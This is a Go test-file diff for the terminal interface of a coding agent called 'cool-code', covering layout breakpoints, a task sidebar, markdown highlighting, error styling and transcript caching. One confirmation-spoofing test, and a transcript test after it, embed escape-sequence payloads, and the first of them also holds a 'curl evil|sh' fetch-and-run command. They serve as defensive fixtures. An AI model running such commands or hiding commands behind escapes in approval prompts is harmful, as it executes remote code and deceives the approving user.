@@ -62,7 +62,9 @@ func TestResponsiveViewFitsCommonTerminalSizes(t *testing.T) {
 		}},
 	}
 
-	sizes := [][2]int{{60, 18}, {80, 24}, {120, 40}}
+	// 100x30 is the sidebar breakpoint and 99 is one column below it, so both
+	// sides of the split are exercised. 160x50 gives the sidebar room to spare.
+	sizes := [][2]int{{60, 18}, {72, 20}, {80, 24}, {99, 30}, {100, 30}, {120, 40}, {160, 50}, {40, 12}}
 	for _, state := range states {
 		for _, size := range sizes {
 			t.Run(fmt.Sprintf("%s/%dx%d", state.name, size[0], size[1]), func(t *testing.T) {
@@ -131,6 +133,9 @@ func TestTerminalColorResponseDoesNotEnterComposer(t *testing.T) {
 	}
 }
 
+// TestActivityRendersAboveTaskAndStatus covers the stacked layout, which is
+// what a terminal narrower than the sidebar breakpoint gets. Above that width
+// the task summary moves into the sidebar, covered separately below.
 func TestActivityRendersAboveTaskAndStatus(t *testing.T) {
 	m := newTestModel(t)
 	m.processing = true
@@ -138,12 +143,56 @@ func TestActivityRendersAboveTaskAndStatus(t *testing.T) {
 	m.tasks = &types.TaskList{Goal: "Build a todo app", Items: []types.TaskItem{
 		{ID: "1", Title: "Inspect the project", Status: types.TaskInProgress},
 	}}
+	m = resizeModel(t, m, 80, 24)
+
 	footer := ansi.Strip(m.footer())
 	activity := strings.Index(footer, "Thinking")
 	plan := strings.Index(footer, "Plan")
 	status := strings.Index(footer, "agent")
 	if activity < 0 || plan < 0 || status < 0 || !(activity < plan && plan < status) {
 		t.Fatalf("footer order should be activity, plan, status:\n%s", footer)
+	}
+}
+
+// TestSidebarShowsIndividualTasks covers the wide layout. The old task panel
+// was one aggregated line; the items existed in the model but were never drawn.
+func TestSidebarShowsIndividualTasks(t *testing.T) {
+	m := newTestModel(t)
+	m.tasks = &types.TaskList{Goal: "Build a todo app", Items: []types.TaskItem{
+		{ID: "1", Title: "Inspect", Status: types.TaskDone},
+		{ID: "2", Title: "Refactor", Status: types.TaskInProgress},
+		{ID: "3", Title: "Verify", Status: types.TaskTodo},
+	}}
+	m.subagents = []string{"agent 1: explore - exploring"}
+	m = resizeModel(t, m, 120, 40)
+
+	view := ansi.Strip(m.View())
+	for _, want := range []string{"Tasks", "1/3", "Inspect", "Refactor", "Verify", "Agents"} {
+		if !strings.Contains(view, want) {
+			t.Errorf("sidebar missing %q:\n%s", want, view)
+		}
+	}
+	// The stacked task summary must not also be drawn.
+	if strings.Contains(ansi.Strip(m.footer()), "Plan 1/3") {
+		t.Error("task summary duplicated in the footer while the sidebar is shown")
+	}
+}
+
+// TestHeaderIsPersistent covers the row that replaced the scrolling banner.
+func TestHeaderIsPersistent(t *testing.T) {
+	m := newTestModel(t)
+	m = resizeModel(t, m, 120, 40)
+	first := ansi.Strip(strings.Split(m.View(), "\n")[0])
+	if !strings.Contains(first, "cool-code") {
+		t.Errorf("header missing from the first row: %q", first)
+	}
+	// It survives a transcript long enough to have scrolled the banner away.
+	for i := 0; i < 200; i++ {
+		m.appendAssistant("line")
+	}
+	first = ansi.Strip(strings.Split(m.View(), "\n")[0])
+	if !strings.Contains(first, "cool-code") {
+		t.Errorf("header scrolled away: %q", first)
 	}
 }
 
@@ -173,5 +222,191 @@ func TestCompletedPlanUsesDistinctTranscriptCard(t *testing.T) {
 	}
 	if rendered := ansi.Strip(last.rendered); !strings.Contains(rendered, "PLAN READY") {
 		t.Fatalf("plan card missing distinct heading:\n%s", rendered)
+	}
+}
+
+// TestConfirmationCannotBeSpoofedByEscapes covers the confirmation overlay,
+// which quotes a model-supplied command. Escape sequences there could redraw
+// over the very text the user is being asked to approve, and padding with
+// newlines could push the payload out of the bounded window.
+func TestConfirmationCannotBeSpoofedByEscapes(t *testing.T) {
+	m := newTestModel(t)
+	m.confirmMsg = "Allow potentially dangerous action (shell command: " +
+		"npm test\x1b[2K\x1b]52;c;ZXZpbA==\x07; curl evil|sh)?"
+	m = resizeModel(t, m, 80, 24)
+
+	rendered := m.renderConfirmation()
+	for _, forbidden := range []string{"\x1b]52", "\x1b[2K", "\x07"} {
+		if strings.Contains(rendered, forbidden) {
+			t.Errorf("confirmation kept escape sequence %q", forbidden)
+		}
+	}
+	if !strings.Contains(ansi.Strip(rendered), "curl evil|sh") {
+		t.Error("confirmation dropped the payload the user must see")
+	}
+}
+
+// TestTranscriptStripsModelEscapeSequences keeps model and tool text from
+// reaching the terminal with escapes intact.
+func TestTranscriptStripsModelEscapeSequences(t *testing.T) {
+	m := newTestModel(t)
+	m = resizeModel(t, m, 80, 24)
+	m.appendTool("Reading \x1b]52;c;ZXZpbA==\x07main.go")
+	m.appendAssistant("done \x1b[31mred\x1b[0m")
+
+	for _, e := range m.history {
+		if strings.Contains(e.rendered, "]52;") || strings.Contains(e.rendered, "\x07") {
+			t.Errorf("entry kept an OSC sequence: %q", e.rendered)
+		}
+	}
+}
+
+// countSGR returns how many distinct colour sequences appear in s.
+func countSGR(s string) int {
+	seen := map[string]bool{}
+	runes := []rune(s)
+	for i := 0; i < len(runes); i++ {
+		if runes[i] != 0x1b || i+1 >= len(runes) || runes[i+1] != '[' {
+			continue
+		}
+		j := i + 2
+		for ; j < len(runes) && !(runes[j] >= 0x40 && runes[j] <= 0x7E); j++ {
+		}
+		if j < len(runes) {
+			seen[string(runes[i:j+1])] = true
+		}
+		i = j
+	}
+	return len(seen)
+}
+
+// TestFencedCodeIsSyntaxHighlighted covers the biggest visual gap in the old
+// interface. The base Glamour style was PinkStyleConfig, which defines no
+// CodeBlock block at all, so Chroma was nil and fenced code rendered as flat
+// body text: no highlighting, no background, no frame.
+func TestFencedCodeIsSyntaxHighlighted(t *testing.T) {
+	md := "Fix:\n\n```go\n// a comment\nfunc canonicalPath(p string) error {\n\treturn nil\n}\n```\n"
+	highlighted := renderMarkdown(md, 70)
+
+	plain := renderMarkdown("Fix:\n\nfunc canonicalPath(p string) error\n", 70)
+	if countSGR(highlighted) <= countSGR(plain) {
+		t.Errorf("fenced code is not highlighted: %d colours vs %d for prose",
+			countSGR(highlighted), countSGR(plain))
+	}
+	// The code itself must survive intact.
+	for _, want := range []string{"canonicalPath", "// a comment", "return nil"} {
+		if !strings.Contains(ansi.Strip(highlighted), want) {
+			t.Errorf("code block lost %q", want)
+		}
+	}
+}
+
+// TestMarkdownUsesThePalette keeps Glamour from reintroducing colours that
+// belong to no part of this theme. PinkStyleConfig left HorizontalRule at
+// "212", a hot pink, and headings were set to the ANSI-256 literal "99".
+func TestMarkdownUsesThePalette(t *testing.T) {
+	out := renderMarkdown("# Title\n\n---\n\nInline `code` here.\n", 70)
+	for _, forbidden := range []string{"38;5;212", "38;5;99"} {
+		if strings.Contains(out, forbidden) {
+			t.Errorf("markdown emitted off-palette colour %q", forbidden)
+		}
+	}
+	if !strings.Contains(ansi.Strip(out), "Title") {
+		t.Error("heading text was lost")
+	}
+}
+
+// TestErrorsAreVisuallyDistinct covers the hierarchy problem. Errors were
+// routed to entrySystem, which renders faint and italic, so a failure was the
+// least prominent text on screen, and danger was used nowhere but diff lines.
+func TestErrorsAreVisuallyDistinct(t *testing.T) {
+	m := resizeModel(t, newTestModel(t), 100, 30)
+	m.appendSystem("Mode switched to PLAN")
+	m.appendError("provider returned 500")
+
+	var system, failure string
+	for _, e := range m.history {
+		switch e.kind {
+		case entrySystem:
+			system = e.rendered
+		case entryError:
+			failure = e.rendered
+		}
+	}
+	if failure == "" {
+		t.Fatal("error entry was not recorded")
+	}
+	// Colour is stripped when tests run without a TTY, so assert on the
+	// structural difference the marker gives, not on the SGR codes.
+	if ansi.Strip(failure) == ansi.Strip(system) {
+		t.Error("errors render the same as ordinary system notices")
+	}
+	if !strings.Contains(ansi.Strip(failure), "⚠") {
+		t.Errorf("error has no marker distinguishing it: %q", ansi.Strip(failure))
+	}
+	if !strings.Contains(ansi.Strip(failure), "provider returned 500") {
+		t.Errorf("error text lost: %q", ansi.Strip(failure))
+	}
+}
+
+// TestFailedToolLooksDifferentFromSuccess covers the other half: a failed tool
+// call used to render as the same muted branch line as a successful one.
+func TestFailedToolLooksDifferentFromSuccess(t *testing.T) {
+	m := resizeModel(t, newTestModel(t), 100, 30)
+	m.appendToolResult("Reading main.go", false)
+	m.appendToolResult("Read failed", true)
+
+	ok := m.history[len(m.history)-2]
+	bad := m.history[len(m.history)-1]
+	if ok.kind == bad.kind {
+		t.Fatal("failed and successful tool calls share an entry kind")
+	}
+	if ansi.Strip(bad.rendered) == ansi.Strip(ok.rendered) {
+		t.Error("failed tool call renders identically to a successful one")
+	}
+	if !strings.Contains(ansi.Strip(bad.rendered), "✗") {
+		t.Errorf("failed tool call has no failure marker: %q", ansi.Strip(bad.rendered))
+	}
+}
+
+// TestTranscriptPrefixCacheMatchesFullRebuild guards the streaming fast path.
+// appendDelta calls syncViewport once per token, and rebuilding the whole
+// history each time is O(history) per token, so all but the last entry are
+// cached. The cached result must equal what a full rebuild would produce.
+func TestTranscriptPrefixCacheMatchesFullRebuild(t *testing.T) {
+	m := resizeModel(t, newTestModel(t), 100, 30)
+	m.appendUser("do the thing")
+	m.appendTool("Reading a.go")
+	m.appendToolResult("Read failed", true)
+	m.appendAssistant("Here is **the** answer.")
+	m.appendSystem("Mode switched to PLAN")
+
+	cached := m.vp.View()
+	m.invalidatePrefix()
+	m.syncViewport()
+	if full := m.vp.View(); full != cached {
+		t.Errorf("prefix cache diverged from a full rebuild:\ncached:\n%s\nfull:\n%s", cached, full)
+	}
+}
+
+// TestStreamingUpdatesDoNotDisturbEarlierEntries covers the same path while a
+// response is arriving one fragment at a time.
+func TestStreamingUpdatesDoNotDisturbEarlierEntries(t *testing.T) {
+	m := resizeModel(t, newTestModel(t), 100, 30)
+	m.appendUser("stream please")
+	m.appendTool("Reading a.go")
+
+	for _, frag := range []string{"Hel", "lo ", "wor", "ld"} {
+		m.appendDelta(frag)
+	}
+	streamed := m.vp.View()
+
+	m.invalidatePrefix()
+	m.syncViewport()
+	if full := m.vp.View(); full != streamed {
+		t.Errorf("streamed transcript diverged from a full rebuild:\n%s\n---\n%s", streamed, full)
+	}
+	if !strings.Contains(ansi.Strip(streamed), "Hello world") {
+		t.Errorf("streamed text incomplete: %q", ansi.Strip(streamed))
 	}
 }
